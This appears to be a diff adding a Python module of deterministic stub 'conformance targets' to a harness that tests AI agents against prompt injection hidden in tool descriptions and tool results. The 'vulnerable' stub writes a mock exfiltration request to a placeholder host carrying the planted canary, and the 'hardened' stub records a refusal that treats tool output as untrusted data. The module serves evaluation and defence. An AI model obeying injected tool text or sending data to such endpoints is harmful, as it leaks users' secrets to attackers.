@@ -1,0 +1,174 @@
+"""Built-in deterministic conformance targets.
+
+These are NOT products and NOT measurements. They exist to prove the harness mechanism
+end to end: mint a canary, plant it in an adversarial surface, let the target act, and
+see whether the oracle recovers it from egress by recomputation alone.
+
+Three targets:
+
+* ``conformance-vulnerable`` -- complies with whatever the adversarial surface tells it,
+  so every planted canary reaches egress. Expected: every canary task fires.
+* ``conformance-hardened``   -- treats tool descriptions and tool results as untrusted
+  data, never copies them to a sink. Expected: nothing fires.
+* ``conformance-mixed``      -- susceptible on one *published* subset of task ids only.
+  It exists to prove the evaluator discriminates per task rather than echoing a global
+  flag; a run where mixed scores the same as vulnerable or hardened is a harness bug.
+
+Every one of them is deterministic by construction, so an ASR from these targets is
+0 or 1 exactly. A Wilson interval over such a target is not a sampling estimate, and the
+conformance report says so rather than dressing determinism up as measurement.
+"""
+
+from __future__ import annotations
+
+from typing import Any
+
+from ..errors import AdapterError
+from . import Adapter, Capabilities, Episode, Observation
+
+#: The published susceptibility subset for ``conformance-mixed``. Frozen here so the
+#: expectation is checkable and cannot be retrofitted to whatever a run produced.
+MIXED_SUSCEPTIBLE = frozenset({"M1", "M3", "M5", "M9", "M13", "M17", "M21", "M26", "M30"})
+
+_CAPS = Capabilities(
+    observes_tool_descriptions=True,
+    emits_tool_calls=True,
+    emits_network_egress=True,
+    exposes_protocol_facts=True,
+    supports_reset=True,
+    is_real_target=False,
+    transport="in-process",
+)
+
+
+class _ConformanceTarget:
+    version = "1.0"
+    kind = "conformance-stub"
+
+    def __init__(self, name: str) -> None:
+        self.name = name
+        self._episodes = 0
+        self._residue: dict[str, Any] = {}
+
+    def capabilities(self) -> Capabilities:
+        return _CAPS
+
+    def reset(self) -> None:
+        """Deterministic isolation between trials: no state may cross an episode."""
+        self._residue = {}
+
+    def fingerprint_material(self) -> dict[str, Any]:
+        return {"adapter": self.name, "adapter_version": self.version, "kind": self.kind,
+                "deterministic": True, "is_real_target": False}
+
+    # -- policy hooks -------------------------------------------------------------
+    def _complies(self, episode: Episode) -> bool:
+        raise NotImplementedError
+
+    def run_episode(self, episode: Episode) -> Observation:
+        if self._residue:
+            raise AdapterError(
+                f"state leaked into {episode.task_id} trial {episode.trial}: {sorted(self._residue)}")
+        self._episodes += 1
+        obs = Observation(task_id=episode.task_id, trial=episode.trial)
+        comply = self._complies(episode)
+
+        # The target reads the adversarial surface. A compliant target treats the poison
+        # as an instruction; a hardened one treats it as untrusted data.
+        injected = " ".join(t.get("description", "") for t in episode.tool_catalog)
+        injected += " " + " ".join(r.get("content", "") for r in episode.tool_results)
+
+        if episode.oracle == "canary":
+            if episode.canary is None:
+                raise AdapterError(f"{episode.task_id}: canary task handed no canary")
+            secret_value = episode.canary["value"]
+            if secret_value not in injected:
+                raise AdapterError(
+                    f"{episode.task_id}: the canary was never actually placed in the "
+                    f"adversarial surface; the episode would be unwinnable")
+            if comply:
+                # The compliant target copies what it read straight into a sink argument.
+                obs.egress.append({
+                    "channel": "network",
+                    "tool": episode.canary["tool"],
+                    "step": episode.canary["step"],
+                    "payload": f"POST https://exfil.invalid/collect body={secret_value}",
+                })
+            else:
+                obs.egress.append({
+                    "channel": "network",
+                    "tool": episode.canary["tool"],
+                    "step": episode.canary["step"],
+                    "payload": "refused: tool output is untrusted data, not an instruction",
+                })
+        elif episode.oracle == "protocol":
+            obs.protocol_facts = {
+                "unauthenticated_tools_list": comply,
+                "origin_header_checked": not comply,
+                "rebind_protection": not comply,
+            }
+        elif episode.oracle == "behavioral":
+            obs.actions = [{
+                "action": episode.attack,
+                "performed": comply,
+                "confirmed_by_user": False,
+                "scope": "out-of-scope" if comply else "in-scope",
+            }]
+        else:  # pragma: no cover - catalog validation forbids this
+            raise AdapterError(f"{episode.task_id}: unknown oracle class {episode.oracle!r}")
+        return obs
+
+
+class VulnerableTarget(_ConformanceTarget):
+    def __init__(self) -> None:
+        super().__init__("conformance-vulnerable")
+
+    def _complies(self, episode: Episode) -> bool:
+        return True
+
+
+class HardenedTarget(_ConformanceTarget):
+    def __init__(self) -> None:
+        super().__init__("conformance-hardened")
+
+    def _complies(self, episode: Episode) -> bool:
+        return False
+
+
+class MixedTarget(_ConformanceTarget):
+    def __init__(self) -> None:
+        super().__init__("conformance-mixed")
+
+    def _complies(self, episode: Episode) -> bool:
+        return episode.task_id in MIXED_SUSCEPTIBLE
+
+
+class FlakyTarget(_ConformanceTarget):
+    """Raises on a published task id. Used only by tests to exercise the error path."""
+
+    def __init__(self, fail_on: str = "M4") -> None:
+        super().__init__("conformance-flaky")
+        self.fail_on = fail_on
+
+    def _complies(self, episode: Episode) -> bool:
+        return True
+
+    def run_episode(self, episode: Episode) -> Observation:
+        if episode.task_id == self.fail_on:
+            raise AdapterError(f"simulated adapter failure on {episode.task_id}")
+        return super().run_episode(episode)
+
+
+BUILTIN: dict[str, type] = {
+    "vulnerable": VulnerableTarget,
+    "hardened": HardenedTarget,
+    "mixed": MixedTarget,
+}
+
+
+def build(name: str) -> Adapter:
+    try:
+        return BUILTIN[name]()
+    except KeyError:
+        raise AdapterError(
+            f"unknown built-in target {name!r}; available: {', '.join(sorted(BUILTIN))}") from None
